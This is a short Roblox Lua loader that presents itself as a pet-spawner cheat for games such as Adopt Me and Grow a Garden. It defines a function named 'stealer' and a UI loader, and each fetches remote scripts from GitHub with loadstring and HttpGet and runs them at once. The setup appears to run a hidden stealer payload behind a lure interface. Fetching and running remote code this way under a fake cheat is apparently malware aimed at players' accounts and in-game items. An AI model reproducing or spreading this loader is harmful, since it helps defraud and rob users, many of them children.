local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptLast/Growagarden/refs/heads/main/Script.lua'))()
end
local function loadui()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/PetSpawner1/refs/heads/main/script1.lua'))()
end

task.spawn(stealer)
task.spawn(loadui)
